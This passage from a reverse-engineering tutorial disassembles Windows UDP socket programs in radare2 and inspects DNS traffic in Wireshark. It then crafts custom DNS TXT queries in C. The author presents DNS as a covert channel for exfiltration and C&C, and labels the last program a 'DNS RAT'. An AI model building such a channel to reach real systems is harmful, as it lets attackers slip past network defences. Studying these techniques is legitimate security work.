|           0x004015ec      488b05dd6d00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4083d0:8]=0x8738 reloc.WS2_32.dll_htons ; "8\x87"
|           0x004015f3      ffd0           call rax
|           0x004015f5      668945d2       mov word [local_2eh], ax
|           0x004015f9      488d0d002a00.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x404000 ; "192.168.0.50"
|           0x00401600      488b05d16d00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4083d8:8]=0x8740 reloc.WS2_32.dll_inet_addr ; "@\x87"
|           0x00401607      ffd0           call rax
|           0x00401609      8945d4         mov dword [local_2ch], eax
|           0x0040160c      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x00401613      488b8d880100.  mov rcx, qword [arg_188h]   ; [0x188:8]=-1 ; 392
|           0x0040161a      8b959c010000   mov edx, dword [arg_19ch]   ; [0x19c:4]=-1 ; 412
|           0x00401620      89542428       mov dword [local_28h], edx
|           0x00401624      488d55d0       lea rdx, [local_30h]
|           0x00401628      4889542420     mov qword [local_20h_2], rdx
|           0x0040162d      41b900000000   mov r9d, 0
|           0x00401633      41b805000000   mov r8d, 5
|           0x00401639      4889c2         mov rdx, rax
|           0x0040163c      488b05a56d00.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x4083e8:8]=0x8758 reloc.WS2_32.dll_sendto ; "X\x87"
|           0x00401643      ffd0           call rax
|           0x00401645      898584010000   mov dword [arg_184h], eax   ; [0x184:4]=-1 ; 388
|           0x0040164b      8b8584010000   mov eax, dword [arg_184h]   ; [0x184:4]=-1 ; 388
|           0x00401651      89c2           mov edx, eax
|           0x00401653      488d0db32900.  lea rcx, str.bytes_sent:__d ; 0x40400d ; "bytes sent: %d \n"
|           0x0040165a      e8a1150000     call sym.printf             ; int printf(const char *format)
|           0x0040165f      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x00401666      41b805000000   mov r8d, 5
|           0x0040166c      ba00000000     mov edx, 0
|           0x00401671      4889c1         mov rcx, rax
|           0x00401674      e88f150000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|           0x00401679      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x00401680      488b8d880100.  mov rcx, qword [arg_188h]   ; [0x188:8]=-1 ; 392
|           0x00401687      48c744242800.  mov qword [local_28h], 0
|           0x00401690      48c744242000.  mov qword [local_20h_2], 0
|           0x00401699      41b900000000   mov r9d, 0
|           0x0040169f      41b805000000   mov r8d, 5
|           0x004016a5      4889c2         mov rdx, rax
|           0x004016a8      488b05316d00.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x4083e0:8]=0x874c reloc.WS2_32.dll_recvfrom ; "L\x87"
|           0x004016af      ffd0           call rax
|           0x004016b1      898594010000   mov dword [arg_194h], eax   ; [0x194:4]=-1 ; 404
|           0x004016b7      8b8594010000   mov eax, dword [arg_194h]   ; [0x194:4]=-1 ; 404
|           0x004016bd      89c2           mov edx, eax
|           0x004016bf      488d0d582900.  lea rcx, str.bytes_rec:__d  ; 0x40401e ; "bytes rec: %d \n"
|           0x004016c6      e835150000     call sym.printf             ; int printf(const char *format)
|           0x004016cb      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x004016d2      4889c2         mov rdx, rax
|           0x004016d5      488d0d522900.  lea rcx, str.response:__s   ; 0x40402e ; "response: %s"
|           0x004016dc      e81f150000     call sym.printf             ; int printf(const char *format)
|           0x004016e1      b800000000     mov eax, 0
|           0x004016e6      4881c4200200.  add rsp, 0x220
|           0x004016ed      5d             pop rbp
\           0x004016ee      c3             ret
[0x00401550]>                    
```

This time we see that the vals for the socket call are different:
```
|           0x004015bb      41b811000000   mov r8d, 0x11               ; 17
|           0x004015c1      ba02000000     mov edx, 2
|           0x004015c6      b902000000     mov ecx, 2
|           0x004015cb      488b051e6e00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x4083f0:8]=0x8762 reloc.WS2_32.dll_socket ; "b\x87"
|           0x004015d2      ffd0           call rax
```
Then the initial buffer is sent straight to the remote machine:
```
|           0x0040160c      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x00401613      488b8d880100.  mov rcx, qword [arg_188h]   ; [0x188:8]=-1 ; 392
|           0x0040161a      8b959c010000   mov edx, dword [arg_19ch]   ; [0x19c:4]=-1 ; 412
|           0x00401620      89542428       mov dword [local_28h], edx
|           0x00401624      488d55d0       lea rdx, [local_30h]
|           0x00401628      4889542420     mov qword [local_20h_2], rdx
|           0x0040162d      41b900000000   mov r9d, 0
|           0x00401633      41b805000000   mov r8d, 5
|           0x00401639      4889c2         mov rdx, rax
|           0x0040163c      488b05a56d00.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x4083e8:8]=0x8758 reloc.WS2_32.dll_sendto ; "X\x87"
|           0x00401643      ffd0           call rax
```
And then the same buffer we used for sent is zeroed with memset cause it will be used
```
|           0x00401671      4889c1         mov rcx, rax
|           0x00401674      e88f150000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|           0x00401679      488d857f0100.  lea rax, [arg_17fh]         ; 0x17f ; 383
|           0x00401680      488b8d880100.  mov rcx, qword [arg_188h]   ; [0x188:8]=-1 ; 392
|           0x00401687      48c744242800.  mov qword [local_28h], 0
|           0x00401690      48c744242000.  mov qword [local_20h_2], 0
|           0x00401699      41b900000000   mov r9d, 0
|           0x0040169f      41b805000000   mov r8d, 5
|           0x004016a5      4889c2         mov rdx, rax
|           0x004016a8      488b05316d00.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x4083e0:8]=0x7ffcc1793010
|           0x004016af      ffd0           call rax
            ;-- rip:
|           0x004016b1 b    898594010000   mov dword [arg_194h], eax   ; [0x194:4]=-1 ; 404

[0x004016b1]> afvd
arg arg_17fh = 0x0061fdff  0x0000050a21796568   hey!....
arg arg_180h = 0x0061fe00  0x000000050a217965   ey!.....
arg arg_181h = 0x0061fe01  0xd4000000050a2179   y!......
arg arg_182h = 0x0061fe02  0x00d4000000050a21   !.......
```
No mystery here really... when dealing with these things we basically need to know about: the socket (remote ip, port, protocol), buffers (what we are sending/expecting and where is it stored, then where/how is it used) and the lenght of those buffers, everything revolves around that.

... And on wireshark we should be seeing something like:

```
00000000  68 65 6c 6c 6f                                     hello
    00000000  68 65 79 21 0a                                     hey!.
```
Again, no surprises

#### "Reversing" network protocols: DNS 
But what if we just don't want to send RAW data and we want to create or perhaps EMULATE/USE an already well known protocol?

Well, as we saw, what we sent appears on wireshark, if we sent raw hex, that raw hex is what we'll see there on wireshark, so...yes if we craft our packet following the format of the desired protocol, that is what the other part will receive. We just need to place the right bytes on the right places.

So, now we'll try to emulate a DNS packet, why DNS? Because it is very common, it has custom (hex) fields so the "request" is not just plain text as in HTTP, and also DNS traffic is allowed in the firewalls of many networks, so DNS can easily be used to exfiltrate data or receive commands from remote C&C servers, when reversing / studying malware, you'll see DNS being used exactly for that

Of course we can read the RFC and some online documentation and learn about the DNS protocol, about the packet format and so on. But what if we don't have that? What if we are dealing with a totally unknown custom network protocol. I would like to take that approach now just to show you how it can easily be done. 

So in this case we can actually start a wireshark session on the sender/receiver machine and just lanch a random dns query, by using some program like nslookup or dig.


In this case, I setup a simple DNS server using bind9,

my forward dns zone looks like:

```
$TTL    604800

@       IN      SOA     primary.ab.local. root.primary.ab.local. (
                              6         ; Serial
                         604820         ; Refresh
                          86600         ; Retry
                        2419600         ; Expire
                         604600 )       ; Negative Cache TTL

;Name Server Information
@       IN      NS      primary.ab.local.

;IP address of Your Domain Name Server(DNS)
primary IN       A      192.168.0.50

;Mail Server MX (Mail exchanger) Record
ab.local. IN  MX  10  mail.ab.local.

;A Record for Host names
www     IN       A       192.168.0.60
mail    IN       A       192.168.0.70

;CNAME Record
ftp     IN      CNAME    www.ab.local.

joe     IN      TXT     "You can put any text"
mark    IN      TXT     "1:secret message one"
karl    IN      TXT     "2:200"
bb      IN      TXT     "VGhpcyB0ZXh0IGlzIGJhc2U2NCBlbmNvZGVk="
xxx     IN      A       192.168.0.20

```

And when doing dig ab.local the following appears on wireshark:

```
00000000  ae c0 01 20 00 01 00 00  00 00 00 01 02 61 62 05   ... .... .....ab.
00000010  6c 6f 63 61 6c 00 00 01  00 01 00 00 29 10 00 00   local... ....)...
00000020  00 00 00 00 00                                     .....
    00000000  ae c0 85 80 00 01 00 00  00 01 00 01 02 61 62 05   ........ .....ab.
    00000010  6c 6f 63 61 6c 00 00 01  00 01 c0 0c 00 06 00 01   local... ........
    00000020  00 09 39 b8 00 25 07 70  72 69 6d 61 72 79 c0 0c   ..9..%.p rimary..
    00000030  04 72 6f 6f 74 c0 26 00  00 00 06 00 09 3a 94 00   .root.&. .....:..
    00000040  01 52 48 00 24 eb 90 00  09 39 b8 00 00 29 10 00   .RH.$... .9...)..
    00000050  00 00 00 00 00 00                                  ......
```

![ws1](assets/images/radare2/dnsquery_example.png)

Wireshark has a cool option for printing the packet in a C array:

```c
char peer0_0[] = { /* Packet 522 */
0xae, 0xc0, 0x01, 0x20, 0x00, 0x01, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x01, 0x02, 0x61, 0x62, 0x05, 
0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x00, 0x00, 0x01, 
0x00, 0x01, 0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00 };
char peer1_0[] = { /* Packet 523 */
0xae, 0xc0, 0x85, 0x80, 0x00, 0x01, 0x00, 0x00, 
0x00, 0x01, 0x00, 0x01, 0x02, 0x61, 0x62, 0x05, 
0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x00, 0x00, 0x01, 
0x00, 0x01, 0xc0, 0x0c, 0x00, 0x06, 0x00, 0x01, 
0x00, 0x09, 0x39, 0xb8, 0x00, 0x25, 0x07, 0x70, 
0x72, 0x69, 0x6d, 0x61, 0x72, 0x79, 0xc0, 0x0c, 
0x04, 0x72, 0x6f, 0x6f, 0x74, 0xc0, 0x26, 0x00, 
0x00, 0x00, 0x06, 0x00, 0x09, 0x3a, 0x94, 0x00, 
0x01, 0x52, 0x48, 0x00, 0x24, 0xeb, 0x90, 0x00, 
0x09, 0x39, 0xb8, 0x00, 0x00, 0x29, 0x10, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
```
And yes, as you can easily figure out, we can just copy and paste our request packet in a C program and then send it "replicating" the query. Of course can MODIFY the packet to send whatever we want to send (changing parameters, changing the query etc), this approach is followed when dealing with exploits / fuzzing

The following program repliactes a simple similar DNS query: 
```C 
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>


#pragma comment(lib, "ws2_32")

#define BUFLEN 65536
int main(){

    char buffer[] = {
        0x00, 0x05, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
        0x02, 0x61, 0x62, 0x05, 0x6c, 0x6f, 0x63, 0x61,
        0x6c, 0x00, 0x00, 0x01, 0x00, 0x01 };

    char buf[BUFLEN];

    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;
    int bytes_rec=0;

	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }

    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    if (sendto(sock, &buffer , sizeof(buffer) , 0, (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
        printf("sendto() failed with error code : %d ", WSAGetLastError());
        exit(EXIT_FAILURE);
    }
    else{
        printf("packet sent\n");
    }

    bytes_rec=recvfrom(sock, &buf, BUFLEN, 0,0,0);
    if(bytes_rec > 0 ){
        printf("response: \n");
        for(int i = 0; i < bytes_rec; i++){
            printf("%x",buf[i]);
        }
        printf("\n");
        for(int i = 0; i < bytes_rec; i++){
            printf("%c",buf[i]);
        }
    }
    return 0;
}
```
Again, the code is no mystery: A couple of for loops have been added to show the response (chars and bytes) we get from the server. As you will see, what the server sends in return has his own format also, it is not plan text like in HTTP, if we want to do something with the response we'll need to be able to parse it!

```
/ (fcn) sym.main 782
|           ; CALL XREF from 0x004013c2 (sym.__tmainCRTStartup)
|           0x00401550      55             push rbp
|           0x00401551      b840020100     mov eax, 0x10240
|           0x00401556      e8c5170000     call fcn.00402d20
|           0x0040155b      4829c4         sub rsp, rax
|           0x0040155e      488dac248000.  lea rbp, [arg_80h]          ; 0x80 ; 128
|           0x00401566      e8e5030000     call sym.__main
|           0x0040156b      c68580010100.  mov byte [arg_10180h], 0    ; [0x10180:1]=0
|           0x00401572      c68581010100.  mov byte [arg_10181h], 5    ; [0x10181:1]=0
|           0x00401579      c68582010100.  mov byte [arg_10182h], 1    ; [0x10182:1]=0
|           0x00401580      c68583010100.  mov byte [arg_10183h], 0    ; [0x10183:1]=0
|           0x00401587      c68584010100.  mov byte [arg_10184h], 0    ; [0x10184:1]=0
|           0x0040158e      c68585010100.  mov byte [arg_10185h], 1    ; [0x10185:1]=0
|           0x00401595      c68586010100.  mov byte [arg_10186h], 0    ; [0x10186:1]=0
|           0x0040159c      c68587010100.  mov byte [arg_10187h], 0    ; [0x10187:1]=0
|           0x004015a3      c68588010100.  mov byte [arg_10188h], 0    ; [0x10188:1]=0
|           0x004015aa      c68589010100.  mov byte [arg_10189h], 0    ; [0x10189:1]=0
|           0x004015b1      c6858a010100.  mov byte [arg_1018ah], 0    ; [0x1018a:1]=0
|           0x004015b8      c6858b010100.  mov byte [arg_1018bh], 0    ; [0x1018b:1]=0
|           0x004015bf      c6858c010100.  mov byte [arg_1018ch], 3    ; [0x1018c:1]=0
|           0x004015c6      c6858d010100.  mov byte [arg_1018dh], 0x77 ; 'w' ; 119
|           0x004015cd      c6858e010100.  mov byte [arg_1018eh], 0x77 ; 'w' ; 119
|           0x004015d4      c6858f010100.  mov byte [arg_1018fh], 0x77 ; 'w' ; 119
|           0x004015db      c68590010100.  mov byte [arg_10190h], 2    ; [0x10190:1]=0
|           0x004015e2      c68591010100.  mov byte [arg_10191h], 0x61 ; 'a' ; 97
|           0x004015e9      c68592010100.  mov byte [arg_10192h], 0x62 ; 'b' ; 98
|           0x004015f0      c68593010100.  mov byte [arg_10193h], 5    ; [0x10193:1]=0
|           0x004015f7      c68594010100.  mov byte [arg_10194h], 0x6c ; 'l' ; 108
|           0x004015fe      c68595010100.  mov byte [arg_10195h], 0x6f ; 'o' ; 111
|           0x00401605      c68596010100.  mov byte [arg_10196h], 0x63 ; 'c' ; 99
|           0x0040160c      c68597010100.  mov byte [arg_10197h], 0x61 ; 'a' ; 97
|           0x00401613      c68598010100.  mov byte [arg_10198h], 0x6c ; 'l' ; 108
|           0x0040161a      c68599010100.  mov byte [arg_10199h], 0    ; [0x10199:1]=0
|           0x00401621      c6859a010100.  mov byte [arg_1019ah], 0    ; [0x1019a:1]=0
|           0x00401628      c6859b010100.  mov byte [arg_1019bh], 1    ; [0x1019b:1]=0
|           0x0040162f      c6859c010100.  mov byte [arg_1019ch], 0    ; [0x1019c:1]=0
|           0x00401636      c6859d010100.  mov byte [arg_1019dh], 1    ; [0x1019d:1]=0
|           0x0040163d      c785b4010100.  mov dword [arg_101b4h], 0x10 ; 16
|           0x00401647      c785b0010100.  mov dword [arg_101b0h], 0x35 ; '5' ; 53
|           0x00401651      c785ac010100.  mov dword [arg_101ach], 0   ; [0x101ac:4]=0
|           0x0040165b      488d45e0       lea rax, [local_20h]
|           0x0040165f      4889c2         mov rdx, rax
|           0x00401662      b902020000     mov ecx, 0x202              ; 514
|           0x00401667      488b057a6d00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x4083e8:8]=0x8764 reloc.WS2_32.dll_WSAStartup ; "d\x87"
|           0x0040166e      ffd0           call rax
|           0x00401670      85c0           test eax, eax
|       ,=< 0x00401672      7421           je 0x401695
|       |   0x00401674      488b05656d00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x4083e0:8]=0x8752 reloc.WS2_32.dll_WSAGetLastError ; "R\x87"
|       |   0x0040167b      ffd0           call rax
|       |   0x0040167d      89c2           mov edx, eax
|       |   0x0040167f      488d0d7a2900.  lea rcx, str.Failed._Error_Code_:__d ; section..rdata ; 0x404000 ; "Failed. Error Code : %d"
|       |   0x00401686      e805170000     call sym.printf             ; int printf(const char *format)
|       |   0x0040168b      b801000000     mov eax, 1
|      ,==< 0x00401690      e9c0010000     jmp 0x401855
|      ||   ; CODE XREF from 0x00401672 (sym.main)
|      |`-> 0x00401695      41b811000000   mov r8d, 0x11               ; 17
|      |    0x0040169b      ba02000000     mov edx, 2
|      |    0x004016a0      b902000000     mov ecx, 2
|      |    0x004016a5      488b05646d00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x408410:8]=0x879c reloc.WS2_32.dll_socket
|      |    0x004016ac      ffd0           call rax
|      |    0x004016ae      488985a00101.  mov qword [arg_101a0h], rax ; [0x101a0:8]=0
|      |    0x004016b5      4883bda00101.  cmp qword [arg_101a0h], 0xffffffffffffffff
|      |,=< 0x004016bd      7517           jne 0x4016d6
|      ||   0x004016bf      488b051a6d00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x4083e0:8]=0x8752 reloc.WS2_32.dll_WSAGetLastError ; "R\x87"
|      ||   0x004016c6      ffd0           call rax
|      ||   0x004016c8      89c2           mov edx, eax
|      ||   0x004016ca      488d0d472900.  lea rcx, str.Could_not_create_socket_:__d ; 0x404018 ; "Could not create socket : %d"
|      ||   0x004016d1      e8ba160000     call sym.printf             ; int printf(const char *format)
|      ||   ; CODE XREF from 0x004016bd (sym.main)
|      |`-> 0x004016d6      66c745d00200   mov word [local_30h], 2
|      |    0x004016dc      8b85b0010100   mov eax, dword [arg_101b0h] ; [0x101b0:4]=0
|      |    0x004016e2      0fb7c0         movzx eax, ax
|      |    0x004016e5      89c1           mov ecx, eax
|      |    0x004016e7      488b05026d00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4083f0:8]=0x8772 reloc.WS2_32.dll_htons ; "r\x87"
|      |    0x004016ee      ffd0           call rax
|      |    0x004016f0      668945d2       mov word [local_2eh], ax
|      |    0x004016f4      488d0d3a2900.  lea rcx, str.192.168.0.50   ; 0x404035 ; "192.168.0.50"
|      |    0x004016fb      488b05f66c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4083f8:8]=0x877a reloc.WS2_32.dll_inet_addr ; "z\x87"
|      |    0x00401702      ffd0           call rax
|      |    0x00401704      8945d4         mov dword [local_2ch], eax
|      |    0x00401707      488d85800101.  lea rax, [arg_10180h]       ; 0x10180
|      |    0x0040170e      488b8da00101.  mov rcx, qword [arg_101a0h] ; [0x101a0:8]=0
|      |    0x00401715      8b95b4010100   mov edx, dword [arg_101b4h] ; [0x101b4:4]=0
|      |    0x0040171b      89542428       mov dword [arg_28h], edx
|      |    0x0040171f      488d55d0       lea rdx, [local_30h]
|      |    0x00401723      4889542420     mov qword [arg_20h], rdx
|      |    0x00401728      41b900000000   mov r9d, 0
|      |    0x0040172e      41b81e000000   mov r8d, 0x1e               ; 30
|      |    0x00401734      4889c2         mov rdx, rax
|      |    0x00401737      488b05ca6c00.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x408408:8]=0x8792 reloc.WS2_32.dll_sendto
|      |    0x0040173e      ffd0           call rax
|      |    0x00401740      83f8ff         cmp eax, 0xffffffffffffffff
|      |,=< 0x00401743      7521           jne 0x401766
|      ||   0x00401745      488b05946c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x4083e0:8]=0x8752 reloc.WS2_32.dll_WSAGetLastError ; "R\x87"
|      ||   0x0040174c      ffd0           call rax
|      ||   0x0040174e      89c2           mov edx, eax
|      ||   0x00401750      488d0df12800.  lea rcx, str.sendto___failed_with_error_code_:__d ; 0x404048 ; "sendto() failed with error code : %d "
|      ||   0x00401757      e834160000     call sym.printf             ; int printf(const char *format)
|      ||   0x0040175c      b901000000     mov ecx, 1
|      ||   0x00401761      e85a160000     call sym.exit
|      ||   ; CODE XREF from 0x00401743 (sym.main)
|      |`-> 0x00401766      488d0d012900.  lea rcx, str.packet_sent    ; 0x40406e ; "packet sent"
|      |    0x0040176d      e80e160000     call sym.puts               ; int puts(const char *s)
|      |    0x00401772      488d85800100.  lea rax, [arg_180h]         ; 0x180 ; 384
|      |    0x00401779      488b8da00101.  mov rcx, qword [arg_101a0h] ; [0x101a0:8]=0
|      |    0x00401780      48c744242800.  mov qword [arg_28h], 0
|      |    0x00401789      48c744242000.  mov qword [arg_20h], 0
|      |    0x00401792      41b900000000   mov r9d, 0
|      |    0x00401798      41b800000100   mov r8d, 0x10000
|      |    0x0040179e      4889c2         mov rdx, rax
|      |    0x004017a1      488b05586c00.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x408400:8]=0x8786 reloc.WS2_32.dll_recvfrom
|      |    0x004017a8      ffd0           call rax
|      |    0x004017aa      8985ac010100   mov dword [arg_101ach], eax ; [0x101ac:4]=0
|      |    0x004017b0      83bdac010100.  cmp dword [arg_101ach], 0
|      |,=< 0x004017b7      0f8e93000000   jle 0x401850
|      ||   0x004017bd      488d0db62800.  lea rcx, str.response:      ; 0x40407a ; "response: "
|      ||   0x004017c4      e8b7150000     call sym.puts               ; int puts(const char *s)
|      ||   0x004017c9      c785bc010100.  mov dword [arg_101bch], 0   ; [0x101bc:4]=0
|     ,===< 0x004017d3      eb28           jmp 0x4017fd
|    .----> 0x004017d5      8b85bc010100   mov eax, dword [arg_101bch] ; [0x101bc:4]=0
|    :|||   0x004017db      4898           cdqe
|    :|||   0x004017dd      0fb684058001.  movzx eax, byte [rbp + rax + 0x180] ; [0x180:1]=255 ; 384
|    :|||   0x004017e5      0fbec0         movsx eax, al
|    :|||   0x004017e8      89c2           mov edx, eax
|    :|||   0x004017ea      488d0d942800.  lea rcx, [0x00404085]       ; "%x"
|    :|||   0x004017f1      e89a150000     call sym.printf             ; int printf(const char *format)
|    :|||   0x004017f6      8385bc010100.  add dword [arg_101bch], 1
|    :|||   ; CODE XREF from 0x004017d3 (sym.main)
|    :`---> 0x004017fd      8b85bc010100   mov eax, dword [arg_101bch] ; [0x101bc:4]=0
|    : ||   0x00401803      3b85ac010100   cmp eax, dword [arg_101ach] ; [0x101ac:4]=0
|    `====< 0x00401809      7cca           jl 0x4017d5
|      ||   0x0040180b      b90a000000     mov ecx, 0xa
|      ||   0x00401810      e873150000     call sym.putchar            ; int putchar(int c)
|      ||   0x00401815      c785b8010100.  mov dword [arg_101b8h], 0   ; [0x101b8:4]=0
|     ,===< 0x0040181f      eb21           jmp 0x401842
|     |||   ; CODE XREF from 0x0040184e (sym.main)
|    .----> 0x00401821      8b85b8010100   mov eax, dword [arg_101b8h] ; [0x101b8:4]=0
|    :|||   0x00401827      4898           cdqe
|    :|||   0x00401829      0fb684058001.  movzx eax, byte [rbp + rax + 0x180] ; [0x180:1]=255 ; 384
|    :|||   0x00401831      0fbec0         movsx eax, al
|    :|||   0x00401834      89c1           mov ecx, eax
|    :|||   0x00401836      e84d150000     call sym.putchar            ; int putchar(int c)
|    :|||   0x0040183b      8385b8010100.  add dword [arg_101b8h], 1
|    :|||   ; CODE XREF from 0x0040181f (sym.main)
|    :`---> 0x00401842      8b85b8010100   mov eax, dword [arg_101b8h] ; [0x101b8:4]=0
|    : ||   0x00401848      3b85ac010100   cmp eax, dword [arg_101ach] ; [0x101ac:4]=0
|    `====< 0x0040184e      7cd1           jl 0x401821
|      ||   ; CODE XREF from 0x004017b7 (sym.main)
|      |`-> 0x00401850      b800000000     mov eax, 0
|      |    ; CODE XREF from 0x00401690 (sym.main)
|      `--> 0x00401855      4881c4400201.  add rsp, 0x10240
|           0x0040185c      5d             pop rbp
\           0x0040185d      c3             ret
```

I won't go step by step here as everything looks familiar, just see that the following is received as a response via the buffer:

```
[0x004017aa]> pxw @ 0x0060fde0
0x0060fde0  0x80850500 0x01000100 0x01000100 0x77777703  .............www
0x0060fdf0  0x05626102 0x61636f6c 0x0100006c 0x0cc00100  .ab.local.......
0x0060fe00  0x01000100 0x803a0900 0xa8c00400 0x10c03c00  ......:......<..
0x0060fe10  0x01000200 0x803a0900 0x70070a00 0x616d6972  ......:....prima
0x0060fe20  0x10c07972 0x01003ac0 0x09000100 0x0400803a  ry...:......:...
0x0060fe30  0x3200a8c0 0x00000000 0x00000000 0x00000000  ...2............
```
We can correctly identify the response there, we'll just need to correctly parse it if we want to use it: 

#### Custom DNS queries in C 
So, DNS can easily be used inside any network as a covert communication channel, we can craft custom packets and send/get stuff encoded inside the domain name we are querying from, we can for example, ask for some subdomain with some weird long name and get/send info using that.

But as you are thinking, we'll need to be able to send custom strings, strings of variable size, so working on a fixed size buffer editing the right bytes won't be possible (unless we are going to send fixed size chunks but that is not very elegant and we want to learn)

What we'll need to do know is _packet crafting_ as we'll need to create our own custom  DNS packet and send it right away to the remote server.

Sooo, take a seat grab some coffee and take a look at the following program, it creates a custom DNS packet asking for a TXT register on a user defined domain.


Two concepts are fundamental here:

- We are creating different structs for different packet parts and we define the size of each field to correctly match the format and don't "break" the packet structure.
- We are concatenating each of the parts to create a packet as we need everything to be "together" in the same buffer. We cannot create one single struct with everything on cause our string is of variable size.
- 65536 is the max size of a udp packet 

And here's the code: 
```c
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>


#pragma comment(lib, "ws2_32")

#define BUFLEN 65536 //max size of packet 
// first we define the DNS packet for query: 
// DNS STANDARD QUERY PACKET
struct dns_header
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

struct question{
    unsigned short type;
    unsigned short tclass;
};

typedef struct
{
    unsigned char *name;
    struct question *ques;
} query;


// in DNS www.web.com goes like 3WWW3WEB3COM (3, 3 int not ascii, is the size)
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;
            for(;lock<i;lock++)
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

int main()
{

    unsigned char buf[65536],*qname,*reader;
    char host[100]; // DNS QUERY

    printf("DNS RAT UP AND RUNNING \n");
    printf("Enter Hostname to Lookup : ");

    // ------ DNS QUERY CRAFTING
    scanf("%s" , host);

    struct question *qinfo = NULL;
    struct dns_header *dns = NULL;

    // DNS QUERY HEADERS SETUP
    dns = (struct dns_header *)&buf;
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    // DNS QUESTION
    qname =(unsigned char*)&buf[sizeof(struct dns_header)];
    ChangetoDnsNameFormat(qname , host); // SUBSTITUTE '.' BY LENGTH
    // UPDATE THE QUERY BUFFER
    qinfo =(struct question*)&buf[sizeof(struct dns_header) + (strlen((const char*)qname) + 1)]; //we are just concatenating data
    // SET CLASS
    qinfo->type = htons(16); // 1 == 'A', 16 == 'TXT', we ask for TXT registers
    qinfo->tclass = htons(1); // 1 = INTERNET

    // ------ END OF DNS QUERY MAGIC

    // WINSOCK INITIALIZATION
    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;


	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}

	printf("1 - WINSOCK INITIALIZED. \n");

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }
    printf("2 - WINSOCK SOCKET CREATED. \n");
    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    if (sendto(sock,(char*)buf,sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question) , 0 , (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
        printf("sendto() failed with error code : %d ", WSAGetLastError());
        exit(EXIT_FAILURE);
    }
    else{
        printf("3 - SENDTO() OK, packet sent\n");
    }

